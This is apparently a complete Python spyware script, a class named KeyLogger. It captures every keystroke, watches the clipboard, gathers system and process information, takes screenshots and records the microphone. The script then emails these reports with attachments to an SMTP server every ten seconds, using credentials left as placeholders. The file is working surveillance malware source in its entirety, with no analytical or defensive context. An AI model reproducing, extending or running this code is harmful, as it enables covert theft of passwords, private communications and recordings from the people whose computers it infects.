import os
import platform
import smtplib
import socket
import threading
import wave
import time
import zipfile
import psutil
import pyperclip
import sounddevice as sd
import pyscreenshot as ImageGrab
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText

EMAIL_ADDRESS = "ADD YOUR USERNAME"
EMAIL_PASSWORD = "ADD YOUR PASSWORD"
SEND_REPORT_EVERY = 10  # seconds
MAX_ATTACHMENT_SIZE = 4 * 1024 * 1024  # 4 MB


class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.email = email
        self.password = password
        self.log = ""
        self.clipboard_text = ""

    def append_log(self, string):
        self.log += string

    def save_data(self, key):
        try:
            self.append_log(str(key.char))
        except AttributeError:
            if key == key.space:
                self.append_log(" [SPACE] ")
            elif key == key.esc:
                self.append_log(" [ESC] ")
            else:
                self.append_log(f" [{key}] ")

    def clipboard_monitor(self):
        while True:
            try:
                text = pyperclip.paste()
                if text != self.clipboard_text:
                    self.clipboard_text = text
                    self.append_log(f"\n[Clipboard] {text}\n")
            except Exception:
                pass
            time.sleep(5)

    def get_system_info(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system_info = f"""
        Hostname: {hostname}
        IP Address: {ip_address}
        Processor: {platform.processor()}
        System: {platform.system()}
        Machine: {platform.machine()}
        Running Processes: {[p.info for p in psutil.process_iter(['pid', 'name'])][:5]}
        """
        self.append_log(system_info + "\n")

    def screenshot(self):
        img = ImageGrab.grab()
        filename = "screenshot.png"
        img.save(filename)
        return filename

    def record_microphone(self):
        fs = 44100
        seconds = 3
        filename = "audio.wav"
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())
        return filename

    def create_zip(self, files, output_zip):
        with zipfile.ZipFile(output_zip, 'w') as zipf:
            for file in files:
                if os.path.exists(file):
                    zipf.write(file)
        return output_zip

    def send_email(self, subject, message, attachments=[]):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))

        total_size = sum(os.path.getsize(f) for f in attachments if os.path.exists(f))
        if total_size > MAX_ATTACHMENT_SIZE:
            if attachments:
                zip_file = self.create_zip(attachments, "attachments.zip")
                attachments = [zip_file]

        for file in attachments:
            if os.path.exists(file):
                with open(file, "rb") as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file)}')
                    msg.attach(part)

        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(self.email, self.password)
            server.send_message(msg)

    def report(self):
        try:
            screenshot_file = self.screenshot()
            audio_file = self.record_microphone()
            attachments = [screenshot_file, audio_file]

            self.send_email(subject="Keylogger Report", message=self.log, attachments=attachments)

            self.log = ""
            for file in attachments:
                if os.path.exists(file):
                    os.remove(file)

        except Exception as e:
            print(f"Report error: {e}")

        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def run(self):
        self.get_system_info()

        clipboard_thread = threading.Thread(target=self.clipboard_monitor)
        clipboard_thread.daemon = True
        clipboard_thread.start()

        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        keyboard_listener.start()

        self.report()

        keyboard_listener.join()


if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
